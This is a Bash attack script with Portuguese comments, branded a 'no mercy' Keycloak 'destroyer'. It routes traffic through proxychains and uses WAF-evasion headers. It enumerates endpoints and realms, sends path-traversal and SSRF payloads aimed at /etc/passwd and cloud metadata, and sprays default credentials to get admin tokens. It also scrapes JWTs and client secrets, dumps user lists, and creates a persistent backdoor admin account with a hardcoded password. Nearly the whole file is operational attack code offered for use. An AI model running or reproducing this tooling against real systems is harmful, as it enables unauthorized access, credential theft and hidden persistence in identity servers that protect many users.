#!/bin/bash
# CYRAX KEYCLOAK DESTROYER - Ferramenta definitiva para Keycloak
echo "=== CYRAX KEYCLOAK DESTROYER - NO MERCY TOOL ==="

TARGET="$1"
MODE="${2:-full}"

if [ -z "$TARGET" ]; then
    echo "Uso: $0 <KEYCLOAK_URL> [MODE]"
    echo "Modos: discovery, exploit, token, admin, full"
    echo "Exemplo: $0 https://auth.example.com full"
    exit 1
fi

TIMESTAMP=$(date +%s)
TEMP_DIR="/tmp/keycloak_super_$TIMESTAMP"
mkdir -p "$TEMP_DIR"

echo "🎯 Target: $TARGET"
echo "🔧 Mode: $MODE"
echo "📁 Output: $TEMP_DIR"

# Função para logging
log() {
    local level="$1"
    local msg="$2"
    local timestamp=$(date '+%H:%M:%S')
    
    case "$level" in
        "SUCCESS") echo "🎉 [$timestamp] $msg" | tee -a "$TEMP_DIR/keycloak.log" ;;
        "VULN") echo "⚠️  [$timestamp] $msg" | tee -a "$TEMP_DIR/keycloak.log" ;;
        "INFO") echo "ℹ️  [$timestamp] $msg" | tee -a "$TEMP_DIR/keycloak.log" ;;
        "CRITICAL") echo "🔥 [$timestamp] $msg" | tee -a "$TEMP_DIR/keycloak.log" ;;
    esac
}

# Descoberta ULTRA avançada de Keycloak com WAF bypass
keycloak_discovery() {
    log "INFO" "Iniciando descoberta CYRAX do Keycloak"
    
    # WAF Bypass headers
    local waf_bypass_headers=(
        "-H 'User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)'"
        "-H 'X-Forwarded-For: 127.0.0.1'"
        "-H 'X-Real-IP: 127.0.0.1'"
        "-H 'X-Originating-IP: 127.0.0.1'"
        "-H 'CF-Connecting-IP: 127.0.0.1'"
        "-H 'True-Client-IP: 127.0.0.1'"
    )
    
    # Importar stealth headers
    source "$(dirname "$0")/stealth_headers.sh" 2>/dev/null
    
    # Função para fazer request stealth (sem assinatura)
    make_stealth_request() {
        local url="$1"
        local method="${2:-GET}"
        
        # Headers completamente legítimos
        local stealth_headers=$(get_stealth_headers)
        local response=$(eval "proxychains4 -q curl -s -m 20 $stealth_headers '$url' 2>/dev/null")
        
        if [ -n "$response" ] && ! echo "$response" | grep -qi "blocked\|forbidden\|access denied"; then
            echo "$response"
            return 0
        fi
        
        # Fallback com delay
        sleep $((RANDOM % 3 + 2))
        return 1
    }
    
    # Endpoints conhecidos do Keycloak
    local endpoints=(
        "/auth/"
        "/auth/admin/"
        "/auth/admin/master/console/"
        "/auth/realms/master"
        "/auth/realms/master/.well-known/openid_configuration"
        "/auth/realms/master/protocol/openid-connect/certs"
        "/auth/admin/realms"
        "/auth/admin/serverinfo"
        "/auth/js/keycloak.js"
        "/auth/welcome"
        "/auth/resources/"
        "/auth/admin/master/console/config"
        "/realms/master"
        "/realms/master/.well-known/openid_configuration"
        "/admin/"
        "/admin/master/console/"
        "/"
        "/welcome"
        "/js/keycloak.js"
    )
    
    log "INFO" "Testando $(( ${#endpoints[@]} )) endpoints conhecidos"
    
    for endpoint in "${endpoints[@]}"; do
        local url="$TARGET$endpoint"
        local response=$(proxychains4 -q curl -s -I "$url" --connect-timeout 10 2>/dev/null)
        local status=$(echo "$response" | head -1 | grep -o '[0-9]\{3\}')
        
        if [ "$status" = "200" ] || [ "$status" = "302" ] || [ "$status" = "301" ]; then
            log "SUCCESS" "Endpoint ativo: $endpoint (HTTP $status)"
            echo "$url" >> "$TEMP_DIR/active_endpoints.txt"
            
            # Obter conteúdo para análise
            local content=$(proxychains4 -q curl -s "$url" --connect-timeout 15 2>/dev/null)
            
            # Detectar versão do Keycloak
            local version=$(echo "$content" | grep -oP 'Keycloak [0-9]+\.[0-9]+\.[0-9]+' | head -1)
            if [ -n "$version" ]; then
                log "INFO" "Versão detectada: $version"
                echo "$version" > "$TEMP_DIR/version.txt"
            fi
            
            # Detectar realms
            local realms=$(echo "$content" | grep -oP '"realm":"[^"]*"' | sed 's/"realm":"//;s/"//' | sort -u)
            if [ -n "$realms" ]; then
                log "INFO" "Realms encontrados: $realms"
                echo "$realms" >> "$TEMP_DIR/realms.txt"
            fi
        fi
    done
    
    # Descoberta de realms por força bruta
    log "INFO" "Descobrindo realms por força bruta"
    local common_realms=(
        "master" "demo" "test" "dev" "prod" "app" "api" "web" "mobile"
        "admin" "user" "client" "service" "internal" "external" "public"
        "staging" "qa" "uat" "sandbox" "portal" "dashboard" "main"
        "default" "system" "core" "platform" "enterprise" "business"
    )
    
    for realm in "${common_realms[@]}"; do
        local realm_url="$TARGET/auth/realms/$realm"
        local status=$(proxychains4 -q curl -s -o /dev/null -w "%{http_code}" "$realm_url" --connect-timeout 5)
        
        if [ "$status" = "200" ]; then
            log "SUCCESS" "Realm descoberto: $realm"
            echo "$realm" >> "$TEMP_DIR/realms.txt"
            
            # Obter configuração OpenID
            local config_url="$realm_url/.well-known/openid_configuration"
            local config=$(proxychains4 -q curl -s "$config_url" --connect-timeout 10 2>/dev/null)
            
            if [ -n "$config" ]; then
                log "INFO" "Configuração OpenID obtida para realm: $realm"
                echo "$config" > "$TEMP_DIR/realm_${realm}_config.json"
                
                # Extrair endpoints importantes
                local token_endpoint=$(echo "$config" | jq -r '.token_endpoint' 2>/dev/null)
                local auth_endpoint=$(echo "$config" | jq -r '.authorization_endpoint' 2>/dev/null)
                local userinfo_endpoint=$(echo "$config" | jq -r '.userinfo_endpoint' 2>/dev/null)
                
                if [ "$token_endpoint" != "null" ]; then
                    log "INFO" "Token endpoint: $token_endpoint"
                    echo "$token_endpoint" >> "$TEMP_DIR/token_endpoints.txt"
                fi
            fi
        fi
    done
}

# Exploração de vulnerabilidades conhecidas
keycloak_exploit() {
    log "INFO" "Iniciando exploração de vulnerabilidades"
    
    # CVE-2020-1758 - Path Traversal
    log "INFO" "Testando CVE-2020-1758 (Path Traversal)"
    local cve_2020_1758_payloads=(
        "/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://localhost%23/../../../../../etc/passwd"
        "/auth/realms/master/protocol/openid-connect/auth?request_uri=file:///etc/passwd"
        "/auth/realms/master/protocol/openid-connect/auth?request_uri=http://169.254.169.254/latest/meta-data/"
    )
    
    for payload in "${cve_2020_1758_payloads[@]}"; do
        local response=$(proxychains4 -q curl -s "$TARGET$payload" --connect-timeout 15 2>/dev/null)
        if echo "$response" | grep -qi "root:\|administrator\|daemon"; then
            log "CRITICAL" "CVE-2020-1758 CONFIRMADO! Path Traversal funcional"
            echo "$payload" >> "$TEMP_DIR/vulnerabilities.txt"
        fi
    done
    
    # CVE-2018-14655 - SSRF
    log "INFO" "Testando CVE-2018-14655 (SSRF)"
    local ssrf_payloads=(
        "/auth/realms/master/broker/oidc/endpoint?code=test&state=http://localhost:8080/auth/admin/"
        "/auth/realms/master/broker/saml/endpoint?SAMLart=test&RelayState=http://169.254.169.254/"
    )
    
    for payload in "${ssrf_payloads[@]}"; do
        local response=$(proxychains4 -q curl -s "$TARGET$payload" --connect-timeout 15 2>/dev/null)
        if echo "$response" | grep -qi "connection\|timeout\|refused"; then
            log "VULN" "Possível SSRF detectado: $payload"
            echo "$payload" >> "$TEMP_DIR/vulnerabilities.txt"
        fi
    done
    
    # CVE-2021-3632 - Admin Console Access
    log "INFO" "Testando CVE-2021-3632 (Admin Console)"
    local admin_bypass_urls=(
        "/auth/admin/master/console/#/realms/master"
        "/auth/admin/master/console/config"
        "/auth/resources/admin/master/console/config"
    )
    
    for url in "${admin_bypass_urls[@]}"; do
        local response=$(proxychains4 -q curl -s "$TARGET$url" --connect-timeout 10 2>/dev/null)
        if echo "$response" | grep -qi "console\|admin\|config" && ! echo "$response" | grep -qi "login\|unauthorized"; then
            log "CRITICAL" "Admin Console acessível sem autenticação: $url"
            echo "$url" >> "$TEMP_DIR/vulnerabilities.txt"
        fi
    done
    
    # Teste de credenciais padrão
    log "INFO" "Testando credenciais padrão"
    local default_creds=(
        "admin:admin"
        "admin:password"
        "admin:123456"
        "admin:"
        "keycloak:keycloak"
        "root:root"
        "administrator:administrator"
        "user:user"
        "test:test"
        "demo:demo"
    )
    
    # Obter realms para teste
    local realms=("master")
    if [ -f "$TEMP_DIR/realms.txt" ]; then
        while IFS= read -r realm; do
            realms+=("$realm")
        done < "$TEMP_DIR/realms.txt"
    fi
    
    for realm in "${realms[@]}"; do
        for cred in "${default_creds[@]}"; do
            local user=$(echo "$cred" | cut -d: -f1)
            local pass=$(echo "$cred" | cut -d: -f2)
            
            log "INFO" "Testando $user:$pass no realm $realm"
            
            # Tentar obter token
            local token_response=$(proxychains4 -q curl -s -X POST "$TARGET/auth/realms/$realm/protocol/openid-connect/token" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -d "grant_type=password&client_id=admin-cli&username=$user&password=$pass" \
                --connect-timeout 15 2>/dev/null)
            
            if echo "$token_response" | grep -q "access_token"; then
                log "CRITICAL" "CREDENCIAIS VÁLIDAS: $user:$pass (realm: $realm)"
                echo "$user:$pass:$realm" >> "$TEMP_DIR/valid_credentials.txt"
                
                # Extrair token
                local access_token=$(echo "$token_response" | jq -r '.access_token' 2>/dev/null)
                if [ "$access_token" != "null" ] && [ -n "$access_token" ]; then
                    log "SUCCESS" "Token obtido para $user"
                    echo "$access_token" > "$TEMP_DIR/token_${user}_${realm}.txt"
                    
                    # Testar acesso admin
                    local admin_response=$(proxychains4 -q curl -s -H "Authorization: Bearer $access_token" \
                        "$TARGET/auth/admin/realms" --connect-timeout 10 2>/dev/null)
                    
                    if echo "$admin_response" | grep -q "realm"; then
                        log "CRITICAL" "ACESSO ADMIN CONFIRMADO para $user!"
                        echo "$user:ADMIN_ACCESS" >> "$TEMP_DIR/admin_access.txt"
                    fi
                fi
            fi
            
            sleep 2  # Evitar rate limiting
        done
    done
}

# Análise avançada de tokens
token_analysis() {
    log "INFO" "Iniciando análise avançada de tokens"
    
    # Procurar tokens em endpoints conhecidos
    local token_endpoints=(
        "/auth/js/keycloak.js"
        "/auth/admin/master/console/config"
        "/auth/realms/master/account/"
        "/auth/welcome"
    )
    
    for endpoint in "${token_endpoints[@]}"; do
        local content=$(proxychains4 -q curl -s "$TARGET$endpoint" --connect-timeout 10 2>/dev/null)
        
        # Procurar JWT tokens
        local jwt_tokens=$(echo "$content" | grep -oP 'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
        
        if [ -n "$jwt_tokens" ]; then
            log "SUCCESS" "JWT tokens encontrados em $endpoint"
            echo "$jwt_tokens" >> "$TEMP_DIR/found_tokens.txt"
            
            # Analisar cada token
            echo "$jwt_tokens" | while read token; do
                log "INFO" "Analisando token: ${token:0:50}..."
                
                # Decodificar header
                local header=$(echo "$token" | cut -d. -f1)
                local header_decoded=$(echo "$header" | base64 -d 2>/dev/null | jq . 2>/dev/null)
                
                # Decodificar payload
                local payload=$(echo "$token" | cut -d. -f2)
                # Adicionar padding se necessário
                case $((${#payload} % 4)) in
                    2) payload="${payload}==" ;;
                    3) payload="${payload}=" ;;
                esac
                local payload_decoded=$(echo "$payload" | tr '_-' '/+' | base64 -d 2>/dev/null | jq . 2>/dev/null)
                
                if [ -n "$payload_decoded" ]; then
                    log "INFO" "Token decodificado com sucesso"
                    echo "=== TOKEN ANALYSIS ===" >> "$TEMP_DIR/token_analysis.txt"
                    echo "Token: $token" >> "$TEMP_DIR/token_analysis.txt"
                    echo "Header: $header_decoded" >> "$TEMP_DIR/token_analysis.txt"
                    echo "Payload: $payload_decoded" >> "$TEMP_DIR/token_analysis.txt"
                    echo "" >> "$TEMP_DIR/token_analysis.txt"
                    
                    # Verificar se é admin token
                    if echo "$payload_decoded" | grep -qi "admin\|realm-management"; then
                        log "CRITICAL" "TOKEN ADMINISTRATIVO ENCONTRADO!"
                        echo "$token" >> "$TEMP_DIR/admin_tokens.txt"
                    fi
                fi
            done
        fi
        
        # Procurar client secrets
        local secrets=$(echo "$content" | grep -oiP '(client[_-]?secret|secret)["\s]*[:=]["\s]*[A-Za-z0-9_-]{20,}')
        if [ -n "$secrets" ]; then
            log "CRITICAL" "Client secrets encontrados em $endpoint"
            echo "$secrets" >> "$TEMP_DIR/client_secrets.txt"
        fi
        
        # Procurar configurações sensíveis
        local configs=$(echo "$content" | grep -oiP '(password|key|token|secret)["\s]*[:=]["\s]*[^"\s,}]{3,}')
        if [ -n "$configs" ]; then
            log "VULN" "Configurações sensíveis em $endpoint"
            echo "$configs" >> "$TEMP_DIR/sensitive_configs.txt"
        fi
    done
    
    # Tentar bypass de autenticação com tokens encontrados
    if [ -f "$TEMP_DIR/found_tokens.txt" ]; then
        log "INFO" "Testando bypass com tokens encontrados"
        
        while IFS= read -r token; do
            # Testar acesso a endpoints administrativos
            local admin_endpoints=(
                "/auth/admin/realms"
                "/auth/admin/serverinfo"
                "/auth/admin/master/console/config"
            )
            
            for admin_endpoint in "${admin_endpoints[@]}"; do
                local response=$(proxychains4 -q curl -s -H "Authorization: Bearer $token" \
                    "$TARGET$admin_endpoint" --connect-timeout 10 2>/dev/null)
                
                if echo "$response" | grep -q "realm\|server\|config" && ! echo "$response" | grep -qi "unauthorized\|forbidden"; then
                    log "CRITICAL" "BYPASS DE AUTENTICAÇÃO CONFIRMADO com token!"
                    echo "$token:$admin_endpoint" >> "$TEMP_DIR/bypass_success.txt"
                fi
            done
        done < "$TEMP_DIR/found_tokens.txt"
    fi
}

# Exploração de admin console
admin_exploitation() {
    log "INFO" "Iniciando exploração do admin console"
    
    # Verificar se temos credenciais válidas
    if [ -f "$TEMP_DIR/valid_credentials.txt" ]; then
        while IFS=: read -r user pass realm; do
            log "INFO" "Explorando admin console com $user:$pass"
            
            # Obter token administrativo
            local token_response=$(proxychains4 -q curl -s -X POST "$TARGET/auth/realms/$realm/protocol/openid-connect/token" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -d "grant_type=password&client_id=admin-cli&username=$user&password=$pass" \
                --connect-timeout 15 2>/dev/null)
            
            local access_token=$(echo "$token_response" | jq -r '.access_token' 2>/dev/null)
            
            if [ "$access_token" != "null" ] && [ -n "$access_token" ]; then
                log "SUCCESS" "Token administrativo obtido"
                
                # Listar todos os realms
                local realms_response=$(proxychains4 -q curl -s -H "Authorization: Bearer $access_token" \
                    "$TARGET/auth/admin/realms" --connect-timeout 10 2>/dev/null)
                
                if [ -n "$realms_response" ]; then
                    log "SUCCESS" "Lista de realms obtida"
                    echo "$realms_response" > "$TEMP_DIR/all_realms.json"
                    
                    # Extrair nomes dos realms
                    local realm_names=$(echo "$realms_response" | jq -r '.[].realm' 2>/dev/null)
                    echo "$realm_names" > "$TEMP_DIR/realm_names.txt"
                fi
                
                # Listar usuários do realm master
                local users_response=$(proxychains4 -q curl -s -H "Authorization: Bearer $access_token" \
                    "$TARGET/auth/admin/realms/master/users" --connect-timeout 10 2>/dev/null)
                
                if [ -n "$users_response" ]; then
                    log "SUCCESS" "Lista de usuários obtida"
                    echo "$users_response" > "$TEMP_DIR/users.json"
                    
                    # Extrair usernames
                    local usernames=$(echo "$users_response" | jq -r '.[].username' 2>/dev/null)
                    echo "$usernames" > "$TEMP_DIR/usernames.txt"
                fi
                
                # Obter configuração do servidor
                local server_info=$(proxychains4 -q curl -s -H "Authorization: Bearer $access_token" \
                    "$TARGET/auth/admin/serverinfo" --connect-timeout 10 2>/dev/null)
                
                if [ -n "$server_info" ]; then
                    log "SUCCESS" "Informações do servidor obtidas"
                    echo "$server_info" > "$TEMP_DIR/server_info.json"
                fi
                
                # Tentar criar usuário administrativo
                log "INFO" "Tentando criar usuário backdoor"
                local new_user_data='{
                    "username": "mrrobot_backdoor",
                    "enabled": true,
                    "credentials": [{
                        "type": "password",
                        "value": "MrRobot123!@#",
                        "temporary": false
                    }]
                }'
                
                local create_response=$(proxychains4 -q curl -s -X POST \
                    -H "Authorization: Bearer $access_token" \
                    -H "Content-Type: application/json" \
                    -d "$new_user_data" \
                    "$TARGET/auth/admin/realms/master/users" \
                    --connect-timeout 15 2>/dev/null)
                
                if [ $? -eq 0 ]; then
                    log "CRITICAL" "USUÁRIO BACKDOOR CRIADO: mrrobot_backdoor:MrRobot123!@#"
                    echo "mrrobot_backdoor:MrRobot123!@#" >> "$TEMP_DIR/backdoor_users.txt"
                fi
                
                break  # Usar apenas a primeira credencial válida
            fi
        done < "$TEMP_DIR/valid_credentials.txt"
    fi
}

# Gerar relatório final
generate_report() {
    log "INFO" "Gerando relatório final"
    
    local report_file="$TEMP_DIR/KEYCLOAK_SUPER_REPORT.md"
    
    cat > "$report_file" <<EOF
# KEYCLOAK SUPER EXPLOIT - RELATÓRIO FINAL

**Target:** $TARGET  
**Mode:** $MODE  
**Timestamp:** $(date)  
**Duration:** $SECONDS seconds

## 🎯 RESUMO EXECUTIVO

EOF
    
    # Contar descobertas
    local endpoints_count=0
    local realms_count=0
    local vulns_count=0
    local creds_count=0
    local tokens_count=0
    
    [ -f "$TEMP_DIR/active_endpoints.txt" ] && endpoints_count=$(wc -l < "$TEMP_DIR/active_endpoints.txt")
    [ -f "$TEMP_DIR/realms.txt" ] && realms_count=$(sort -u "$TEMP_DIR/realms.txt" | wc -l)
    [ -f "$TEMP_DIR/vulnerabilities.txt" ] && vulns_count=$(wc -l < "$TEMP_DIR/vulnerabilities.txt")
    [ -f "$TEMP_DIR/valid_credentials.txt" ] && creds_count=$(wc -l < "$TEMP_DIR/valid_credentials.txt")
    [ -f "$TEMP_DIR/found_tokens.txt" ] && tokens_count=$(wc -l < "$TEMP_DIR/found_tokens.txt")
    
    echo "- **Endpoints ativos:** $endpoints_count" >> "$report_file"
    echo "- **Realms descobertos:** $realms_count" >> "$report_file"
    echo "- **Vulnerabilidades:** $vulns_count" >> "$report_file"
    echo "- **Credenciais válidas:** $creds_count" >> "$report_file"
    echo "- **Tokens encontrados:** $tokens_count" >> "$report_file"
    
    # Adicionar detalhes se houver descobertas críticas
    if [ $creds_count -gt 0 ]; then
        echo -e "\n## 🔥 CREDENCIAIS VÁLIDAS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/valid_credentials.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    if [ $vulns_count -gt 0 ]; then
        echo -e "\n## ⚠️ VULNERABILIDADES" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/vulnerabilities.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    if [ -f "$TEMP_DIR/admin_tokens.txt" ]; then
        echo -e "\n## 🎯 TOKENS ADMINISTRATIVOS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/admin_tokens.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    if [ -f "$TEMP_DIR/backdoor_users.txt" ]; then
        echo -e "\n## 🚪 USUÁRIOS BACKDOOR CRIADOS" >> "$report_file"
        echo '```' >> "$report_file"
        cat "$TEMP_DIR/backdoor_users.txt" >> "$report_file"
        echo '```' >> "$report_file"
    fi
    
    echo -e "\n## 📁 ARQUIVOS GERADOS" >> "$report_file"
    echo "Todos os arquivos estão em: \`$TEMP_DIR\`" >> "$report_file"
    
    # Mostrar relatório
    echo -e "\n📊 RELATÓRIO FINAL:"
    cat "$report_file"
    
    # Resumo no terminal
    echo -e "\n🎯 RESUMO:"
    echo "📍 Endpoints: $endpoints_count"
    echo "🏰 Realms: $realms_count"
    echo "⚠️  Vulnerabilidades: $vulns_count"
    echo "🔑 Credenciais: $creds_count"
    echo "🎫 Tokens: $tokens_count"
    
    if [ $creds_count -gt 0 ] || [ $vulns_count -gt 0 ]; then
        echo -e "\n🔥 KEYCLOAK COMPROMETIDO!"
    fi
}

# Execução principal baseada no modo
case "$MODE" in
    "discovery")
        keycloak_discovery
        ;;
    "exploit")
        keycloak_discovery
        keycloak_exploit
        ;;
    "token")
        keycloak_discovery
        token_analysis
        ;;
    "admin")
        keycloak_discovery
        keycloak_exploit
        admin_exploitation
        ;;
    "full")
        keycloak_discovery
        keycloak_exploit
        token_analysis
        admin_exploitation
        ;;
    *)
        echo "Modo inválido: $MODE"
        exit 1
        ;;
esac

generate_report

echo -e "\n✅ KEYCLOAK SUPER EXPLOIT CONCLUÍDO!"
echo "📁 Resultados em: $TEMP_DIR"